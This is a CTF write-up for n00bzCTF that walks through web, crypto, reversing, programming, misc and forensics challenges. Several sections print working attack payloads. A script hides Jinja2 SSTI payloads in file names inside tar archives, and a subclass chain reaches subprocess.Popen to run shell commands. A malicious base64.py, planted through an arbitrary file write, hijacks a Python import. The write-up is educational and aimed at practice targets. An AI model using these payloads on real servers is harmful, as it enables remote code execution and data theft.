* * *
### CTF: **n00bzCTF**
* * *

![image](https://github.com/user-attachments/assets/4fa8daa1-b9f6-4d60-9a81-3b306c0e40c6)

--------------------------------

### Challenges

- Web:
  - Passwordless
  - File Sharing Portal

- Crypto:
  - Vinegar
  - RSA

- Rev:
  - Vacation
    
- Programming:
  - Numbers 2

- Misc:
  - Agree
  - Waas

- Forensics:
  -  Plane
  -  Bad Wave
  
--------------------------------
   
### Web:

### Challenge: Passwordless

![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)

- Explaining the source code:

        #!/usr/bin/env python3
      from flask import Flask, request, redirect, render_template, render_template_string
      import subprocess
      import urllib
      import uuid
      global leet
      
      app = Flask(__name__)
      flag = open('/flag.txt').read()
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      
      @app.route('/',methods=['GET','POST'])
      def main():
          global username
          if request.method == 'GET':
              return render_template('index.html')
          elif request.method == 'POST':
              username = request.values['username']
              if username == 'admin123':
                  return 'Stop trying to act like you are the admin!'
              uid = uuid.uuid5(leet,username) # super secure!
              return redirect(f'/{uid}')
      
      @app.route('/<uid>')
      def user_page(uid):
          if uid != str(uuid.uuid5(leet,'admin123')):
              return f'Welcome! No flag for you :('
          else:
              return flag
      
      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=1337)

- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is hardocded  and the main vulnerability.If the uid is added to the route, it reveals the flag.

      #Leet uid
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      if uid != str(uuid.uuid5(leet,'admin123')):
                return f'Welcome! No flag for you :('
            else:
                return flag

- Creating the uid with python `uuid` module

        ❯ python3
      Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
      Type "help", "copyright", "credits" or "license" for more information.
      >>> import uuid
      >>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      >>> str(uuid.uuid5(leet,'admin123'))
      '3c68e6cc-15a7-59d4-823c-e7563bbb326c'
      >>> 

- Grabbing the flag with curl

         ❯ curl http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c
      n00bz{1337-13371337-1337-133713371337-1337}

--------------------------------


### File Sharing Portal

![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)

### Source Code Analysis/

- The index page `/` accepts upload of only tarfiles, removes the name  and replace it with a sha256 generated hash of a random value,the server uses the `tarfile` module to extract the file,places it in a directory named after the name hash and creates an hyperlink to access the extracted files.

      elif request.method == 'POST':
            file = request.files['file']
            if file.filename[-4:] != '.tar':
                return render_template_string("<p> We only support tar files as of right now!</p>")
            name = sha256(os.urandom(16)).digest().hex()
            os.makedirs(f"./uploads/{name}", exist_ok=True)
            file.save(f"./uploads/{name}/{name}.tar")
            try:
                tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
                tar_file.extractall(path=f'./uploads/{name}/')
                return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")

- The `/view/<name` checks if all the characters are within the range `a-f0-9` and if it appears otherwise, it triggers an error.Then, it uses `os.listdir()` to list the directory of the extracted tar file which is stored in a `list`.Then, it uses this `f'<a href="/read/{name}/{i}">{i}</a>'` line to create an hyperlink to each extracted files. The server uses the function `render_template_string()` to render the html code.Although, the function  is vulnerable to SSTI injection which allows us execute python code on the server. The code executes the name of the extracted file because the server doesn't convert it into a hash. 


       if not all([i in "abcdef1234567890" for i in name]):
            return render_template_string("<p>Error!</p>")
            #print(os.popen(f'ls ./uploads/{name}').read())
                #print(name)
        files = os.listdir(f"./uploads/{name}")
        out = '<h1>Files</h1><br>'
        files.remove(f'{name}.tar')  # Remove the tar file from the list
        for i in files:
            out += f'<a href="/read/{name}/{i}">{i}</a>'
           # except:
        return render_template_string(out)

- SSTI or `Server Side Template Injection` allows an attacker to inject code into templates. The web application was created with Flask and SSTI allows an attacker to inject code into `jinja2` templates. The `render_template_string()` function is the main sink which is responsible to executing the injected code.
  
- I wrote a python script that stores the payload with  `input()` and creates a file with the payload's name.Then, a tarfile named `zip.tar` is created with module `tarfile` and the payload named file is added to it. This code works in an infinite `while True:` loop to prevent the scripting from exiting.


### Proof of Concept

- Code:
      
      #! /usr/bin/env python3
      import tarfile
      
      def exploit(string: str):
          file = open(string,"w")
          file.close()
          #tarfile+ssti exploit
          tarfilez = tarfile.open("zip.tar","w")
          tarfilez.add(string)
          tarfilez.close()
          print("[+]zip.tar created")
      
      def main():
          while True:
                 ssti_string = input("[+]Enter ssti string: ")
                 exploit(ssti_string)
      
      if __name__ == "__main__":
         main()

- Creating the `tarfile`

![image](https://github.com/user-attachments/assets/42725d11-9e19-4c1a-bb82-3220e3a0406c)

- Uploading the tar file shows it works, here is the result of `config`, it should be noted that ssti payloads should be enclosed with \{\{\}\}
  
![image](https://github.com/user-attachments/assets/2aeca84b-8d71-4392-a868-e2f5382fef82)

### RCE

- I got command injection with this payload `"".__class__.__base__.__subclasses__()[351]`, now we can execute shell commands with `class subprocess.Popen`.

![image](https://github.com/user-attachments/assets/889412d1-1e9f-41f9-9f3f-07763f68100f)

### Reading the flag

- I read the flag with this payload `"".__class__.__base__.__subclasses__()[351]("cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt",shell=True,stdout=-1).communicate()`

![image](https://github.com/user-attachments/assets/68a287da-fea8-4b00-bd10-3053431c05f1)

- Flag with curl:

        ❯ curl http://f94014e3-dcf1-4cf2-8cc3-3a72ec904122.challs.n00bzunit3d.xyz:8080/view/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0
      <h1>Files</h1><br><a href="/read/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0/(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)">(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)</a>% 

      
--------------------------------


### CRYPTO:

### Vinegar:

![image](https://github.com/user-attachments/assets/2716cfd9-3f76-4a09-a9af-ff31c1c309fc)

### Cipher text :
  
     Encrypted flag: nmivrxbiaatjvvbcjsf
     key: secretkey

- It is an example of Vigenere cipher, I decoded it with `dcode.fr`

![image](https://github.com/user-attachments/assets/70ccc674-52a7-4493-8bfa-b00077dd2ffc)


--------------------------------

### RSA

![image](https://github.com/user-attachments/assets/fdae0086-7084-4336-8691-f3a0e10d63f2)

- `Rsa values`:

      e = 3
      n = 135112325288715136727832177735512070625083219670480717841817583343851445454356579794543601926517886432778754079508684454122465776544049537510760149616899986522216930847357907483054348419798542025184280105958211364798924985051999921354369017984140216806642244876998054533895072842602131552047667500910960834243
      c = 13037717184940851534440408074902031173938827302834506159512256813794613267487160058287930781080450199371859916605839773796744179698270340378901298046506802163106509143441799583051647999737073025726173300915916758770511497524353491642840238968166849681827669150543335788616727518429916536945395813


- Based on the value of e which is 3, the rsa is vulnerable to the `cube root attack`, we just have to get the cube root of c and convert it to bytes.

- Code:

        #! /usr/bin/env python3
        import libnum
        from Crypto.Util.number import *
        e = 3
        n = 135112325288715136727832177735512070625083219670480717841817583343851445454356579794543601926517886432778754079508684454122465776544049537510760149616899986522216930847357907483054348419798542025184280105958211364798924985051999921354369017984140216806642244876998054533895072842602131552047667500910960834243
        c = 13037717184940851534440408074902031173938827302834506159512256813794613267487160058287930781080450199371859916605839773796744179698270340378901298046506802163106509143441799583051647999737073025726173300915916758770511497524353491642840238968166849681827669150543335788616727518429916536945395813
        flag = long_to_bytes(libnum.nroot(c,3)).decode()
        print(flag)

- Output

        ❯ ./rsa.py
      n00bz{crypt0_1s_1nc0mpl3t3_w1th0ut_rs4!!}

  
--------------------------------

### Rev:

### Vacation:

 ![image](https://github.com/user-attachments/assets/9ba6e0c3-8c8e-4a07-ab95-83f9232d633a)

- The challenge contains this powershell script.

      $bytes = [System.Text.Encoding]::ASCII.GetBytes((cat .\flag.txt))
      [System.Collections.Generic.List[byte]]$newBytes = @()
      $bytes.ForEach({
          $newBytes.Add($_ -bxor 3)
          })
      $newString =  [System.Text.Encoding]::ASCII.GetString($newBytes)
      echo $newString | Out-File -Encoding ascii .\output.txt

- I don't know powershell but I guessed that the code read the `flag.txt` file and xors it with `3` and writes the output to `output.txt`.

- I wrote a script for it.<a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/n00bzctf/scripts/rev/vacation/vacation.py">link to script</a>


- Output:

        ❯ ./vacation.py
      n00bz{from_paris_wth_xor}


--------------------------------


### Programming

### Numbers 2

![image](https://github.com/user-attachments/assets/91a1e5d3-9522-4c9e-a693-447c53295b2b)

- This challenge surrounds solving 100 maths problems. The table below outlines the math problems and their python appproach.

| **Math problems** | **Python approach** |
|-------------------|---------------------|
|  Lcm              |   math.lcm(x,y)     |
|  Gcd              |   math.gcd(x,y)     |
|  Largest prime fac|   custom code       |

- I got the largest prime factor from <a href="https://www.geeksforgeeks.org/find-largest-prime-factor-number/">geekforgeeks</a>.
<a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/n00bzctf/scripts/lpf.py"> Largest prime factor's script</a>

- I wrote a <a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/n00bzctf/scripts/exploitnumbers.py">python script</a> to automate the whole process and suggest you run with good network(omoh, mtn).

- Flag:

![image](https://github.com/user-attachments/assets/0e951039-d857-41f5-a9fe-47af475aae2a)


--------------------------------

### Misc:

### Agree

![image](https://github.com/user-attachments/assets/7407df79-4ad6-4107-bebe-d4286b70a1c9)

- I solved this challenge with the aid of Google dorks.

- I got the first part of the flag with this dork `site:https://ctf.n00bzunit3d.xyz/ intext:Terms of Service`

![image](https://github.com/user-attachments/assets/8c9e4279-15c1-4fa6-97e7-44db7b6f39b3)

- The 2nd part's dork is `site:https://ctf.n00bzunit3d.xyz/ intext:Privacy`

![image](https://github.com/user-attachments/assets/6e8e7168-0856-4024-9275-54012695800f)

- Flag:

      n00bz{Terms_0f_Serv1c3s_4nd_pr1v4cy_p0l1cy_6f3a4d}

--------------------------------

### Waas

![image](https://github.com/user-attachments/assets/d2837bff-4401-48a1-9db6-066419a9a24e)

- The challenge provides a service that allows us to write a file, the challenge contains a source code.
  
- Source code:

          import subprocess
          from base64 import b64decode as d
          while True:
          	print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
          	try:
          		inp = int(input("Choice: ").strip())
          	except:
          		print("Invalid input!")
          		exit(0)
          	if inp == 1:
          		file = input("Enter file name: ").strip()
          		assert file.count('.') <= 2 # Why do you need more?
          		assert "/proc" not in file # Why do you need to write there?
          		assert "/bin" not in file # Why do you need to write there? 
          		assert "\n" not in file # Why do you need these?
          		assert "chall" not in file # Don't be overwriting my files!
          		try: 
          			f = open(file,'w')
          		except:
          			print("Error! Maybe the file does not exist?")
          
          		f.write(input("Data: ").strip())
          		f.close()
          		print("Data written sucessfully!")
          		
          	if inp == 2:
          		flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
          		print(flag.stdout.strip())

- Option 1 allows us to write to a file and triggers an assertion error if the string contains `/proc,/bin,\n and chall`.Then, it tries to read the file and raises an exception if the file does not exist. It takes in the data and write to the file.

### Vulnerability

- The source code imports the base64 module but it does not apply it in the code, we can simply try to overwrite the base64 module's script. Instead of trying to find the py script, we can create the base64.py file in the same directory as the challenge's python file because python `open(,'w')` function automatically creates a file even if it does not exist, so it does not raise the exception. We will be abusing py policy because python checks the challenge code's directory for the module script before it checks python libraries' directory.
- We will be writing this code to our malicious `base64.py` file.

  Payload-: ```import os;print(os.system("cat flag.txt"))```
  
- Th payload imports the `os` module and calls the `system()` to execute shell command `cat flag.txt`.The shell command outputs the contents of the `flag.txt` file.I added `print()` to print the result of `os.system()`.The service executes the content of our malicious `base64.py` if we reconnect to the service

- Exploiting it

![image](https://github.com/user-attachments/assets/a2b7b584-c71a-47a6-a340-8fcd06aff6c5)

- Flag:

       n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_972529c5f5a9}

--------------------------------
  
### Forensics:

![image](https://github.com/user-attachments/assets/73a3f0e2-a18d-4234-92c8-365010fc27ad)

### Plane:

- The challenge's objective was to find the current location the picture below was taken. A picture's metadata or exifdata if not cleared contains sensitive info e.g where the  picture was taken but nowadays it is removed by most social media platforms.

![image](https://github.com/user-attachments/assets/5d297bb4-027f-4c15-a1fe-2ef2e6d32809)


- I checked the metadata with exiftool and got this values
  Command: `exiftool <filename>`

![image](https://github.com/user-attachments/assets/0a058e66-6c95-4498-8943-811fdd3d2184)

- With the aid of chatgpt's insight, I calculated the values and got the flag

- Flag:

      n00bz{13.37,-13.37}

--------------------------------

### Wave

![image](https://github.com/user-attachments/assets/a1ea310e-ad8c-4725-b418-ce41fdf95188)

- The challenge consists of a `wav` file which was corrupt
- I tried `file <file name>` to check the file type but got the `data` output because it has no file header.

![image](https://github.com/user-attachments/assets/a27d8b4b-1408-4c62-9146-3c53d42d34a8)

- I proceeded to add a typical wav file header to it with `hex editor -b filename`.Magic bytes help to distinguish a file from another because a file's magic bytes is  distinctive. I got the magic bytes of a wav file from this <a href="https://medium.com/@arifwc/writeup-bsides-delhi-ctf-2020-never-gonna-give-you-the-flag-forensics-616f547f2492">writeup</a>.

![image](https://github.com/user-attachments/assets/31323a70-7d35-42f0-9166-2ff73d7af8e2)

- After listening to the fixed wav file,the audio corresponds to morse code sounds, I decoded it with this <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">online morse decoder</a>.

![image](https://github.com/user-attachments/assets/ec4c1003-521b-40a8-80fe-727174721410)

- Flag:

      n00bz{beepbopmorsecode}

--------------------------------

### Teammate's writeup:

- **Bl4ckanon's writeup**: <a href="https://github.com/BlackAnon22/BlackAnon22.github.io/blob/main/posts/CTF Competitions/n00bz_ctf.md">here</a>

--------------------------------

Thanks for reading!!!!!

* * *
### REFERENCES:

* * *

- **Largest Prime Factor's script**: <a href="https://www.geeksforgeeks.org/find-largest-prime-factor-number/">GeekforGeeks</a>
- **Wav file's magic bytes**: <a href="https://medium.com/@arifwc/writeup-bsides-delhi-ctf-2020-never-gonna-give-you-the-flag-forensics-616f547f2492">Aricfwc</a>



  


  
 
